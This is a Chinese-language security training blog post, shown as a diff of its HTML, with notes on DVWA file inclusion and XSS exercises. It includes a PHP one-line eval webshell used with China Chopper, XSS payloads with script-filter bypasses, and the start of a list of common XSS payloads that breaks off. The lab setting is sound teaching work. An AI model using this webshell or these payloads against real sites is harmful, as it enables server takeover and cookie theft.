@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/images/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"got17.cn","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.13.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":true,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="上午讲dvwa的文件包含漏洞模块，php一句话木马和菜刀工具的使用。 下午讲跨站注入XSS，文件上传漏洞靶机upload-labs。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【网络安全1x03】安恒厂家网络安全培训 --- day3">
+<meta property="og:url" content="http://got17.cn/1073/index.html">
+<meta property="og:site_name" content="gaoteng&#39;s blog">
+<meta property="og:description" content="上午讲dvwa的文件包含漏洞模块，php一句话木马和菜刀工具的使用。 下午讲跨站注入XSS，文件上传漏洞靶机upload-labs。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-07-01T15:55:08.000Z">
+<meta property="article:modified_time" content="2022-09-03T03:28:56.678Z">
+<meta property="article:author" content="gaoteng17">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="burpsuite">
+<meta property="article:tag" content="upload-labs">
+<meta property="article:tag" content="dvwa">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://got17.cn/1073/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://got17.cn/1073/","path":"1073/","title":"【网络安全1x03】安恒厂家网络安全培训 --- day3"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>【网络安全1x03】安恒厂家网络安全培训 --- day3 | gaoteng's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">gaoteng's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dvwa%E2%80%94File-Inclusion"><span class="nav-number">1.</span> <span class="nav-text">dvwa—File Inclusion</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84"><span class="nav-number">1.1.</span> <span class="nav-text">手工修改路径</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0php%E8%84%9A%E6%9C%AC"><span class="nav-number">1.2.</span> <span class="nav-text">上传php脚本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%A8%E7%AB%99%E6%B3%A8%E5%85%A5XSS"><span class="nav-number">2.</span> <span class="nav-text">跨站注入XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM%E5%9E%8B"><span class="nav-number">2.1.</span> <span class="nav-text">DOM型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reflected%E5%9E%8B"><span class="nav-number">2.2.</span> <span class="nav-text">Reflected型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#low"><span class="nav-number">2.2.1.</span> <span class="nav-text">low</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medium"><span class="nav-number">2.2.2.</span> <span class="nav-text">medium</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high"><span class="nav-number">2.2.3.</span> <span class="nav-text">high</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Stored%E5%9E%8B"><span class="nav-number">2.3.</span> <span class="nav-text">Stored型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8XSS%E4%BB%A3%E7%A0%81"><span class="nav-number">2.4.</span> <span class="nav-text">常用XSS代码</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#upload-labs"><span class="nav-number">3.</span> <span class="nav-text">upload-labs</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="gaoteng17"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">gaoteng17</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">82</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/gaoteng17" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;gaoteng17" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:gaoteng17@gmail.com" title="E-Mail → mailto:gaoteng17@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/5544866728" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5544866728" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://got17.cn/1073/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="gaoteng17">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gaoteng's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="【网络安全1x03】安恒厂家网络安全培训 --- day3 | gaoteng's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【网络安全1x03】安恒厂家网络安全培训 --- day3
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-07-01 23:55:08" itemprop="dateCreated datePublished" datetime="2020-07-01T23:55:08+08:00">2020-07-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-09-03 11:28:56" itemprop="dateModified" datetime="2022-09-03T11:28:56+08:00">2022-09-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>上午讲dvwa的文件包含漏洞模块，php一句话木马和菜刀工具的使用。</p>
+<p>下午讲跨站注入XSS，文件上传漏洞靶机upload-labs。</p>
+<span id="more"></span>
+
+<h1 id="dvwa—File-Inclusion"><a href="#dvwa—File-Inclusion" class="headerlink" title="dvwa—File Inclusion"></a>dvwa—File Inclusion</h1><h2 id="手工修改路径"><a href="#手工修改路径" class="headerlink" title="手工修改路径"></a>手工修改路径</h2><p>修改文件路径，查看报错信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dvwa/vulnerabilities/fi/?page=file1.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改?page=后文件目录为一个不存在文件</span></span><br><span class="line">http://localhost/dvwa/vulnerabilities/fi/?page=abc.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#回显如下：</span></span><br><span class="line">Warning: include(abc.txt): failed to open stream: No such file or directory <span class="keyword">in</span> C:\Study\CTF\tools\phpstudy_pro\WWW\dvwa\vulnerabilities\<span class="keyword">fi</span>\index.php on line 36</span><br><span class="line"></span><br><span class="line">Warning: include(): Failed opening <span class="string">&#x27;abc.txt&#x27;</span> <span class="keyword">for</span> inclusion (include_path=<span class="string">&#x27;.;C:\php\pear;../../external/phpids/0.6/lib/&#x27;</span>) <span class="keyword">in</span> C:\Study\CTF\tools\phpstudy_pro\WWW\dvwa\vulnerabilities\<span class="keyword">fi</span>\index.php on line 36</span><br></pre></td></tr></table></figure>
+
+<p>得到一个路径<code>C:\php\pear;../../external/phpids/0.6/lib/</code></p>
+<h2 id="上传php脚本"><a href="#上传php脚本" class="headerlink" title="上传php脚本"></a>上传php脚本</h2><ol>
+<li>显示php信息：</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#回显内容显示上传路径</span></span><br><span class="line"><span class="comment">#../../hackable/uploads/phpinfo.php succesfully uploaded!</span></span><br><span class="line"><span class="comment">#执行phpinfo()显示当前php版本信息</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>一句话php木马</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#&lt;?php @eval($_POST[pp]);?&gt;</span></span><br><span class="line"><span class="comment">#执行后打开中国菜刀，新建连接，复制url，后面跟上pp，双击访问得到文件目录</span></span><br><span class="line"><span class="comment">#报200是cookie问题，使用菜刀内置浏览器登录一遍dvwa即可</span></span><br><span class="line"><span class="comment">#报500是php版本问题，降到5.2/5.4即可</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="跨站注入XSS"><a href="#跨站注入XSS" class="headerlink" title="跨站注入XSS"></a>跨站注入XSS</h1><p>网站某些留言框、搜索栏对输入内容进行回显，可能存在跨站攻击。</p>
+<p>XSS有三种类型。</p>
+<h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><p>没讲</p>
+<h2 id="Reflected型"><a href="#Reflected型" class="headerlink" title="Reflected型"></a>Reflected型</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>网站源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>由于没有对输入内容进行限制，可以输入下面脚本进行测试：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>回显一个弹出框，内容是<code>/xss/</code>。</p>
+<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p>切换到medium难度，查看网站源码对<code>&lt;script&gt;</code>字段进行过滤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>这个可以对<code>&lt;script&gt;</code>进行双写&#x2F;大小写绕过：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ript&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>回显一个弹出框，内容是<code>/xss/</code>。</p>
+<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>high级别对任何包含<code>script</code>的非连续字符串进行过滤，这个命令基本被完全限制了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>使用另一个命令绕过检测：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;1&#x27;</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>回显一个弹出框，内容是<code>/xss/</code>。</p>
+<h2 id="Stored型"><a href="#Stored型" class="headerlink" title="Stored型"></a>Stored型</h2><p>存储型将内容存到数据库，每次刷新页面都会再回显一次。</p>
+<p>使用命令与反射型相同。</p>
+<p>高级情况下对第二个字段的<code>&lt;&gt;</code>全部过滤，需要抓包修改第一个字段为XSS代码。</p>
+<h2 id="常用XSS代码"><a href="#常用XSS代码" class="headerlink" title="常用XSS代码"></a>常用XSS代码</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;&quot;()&amp;%<span class="tag">&lt;<span class="name">acx</span>&gt;</span><span class="tag">&lt;<span class="name">ScRiPt</span> &gt;</span>prompt(915149)<span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;svg/onload=alert(1)&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span 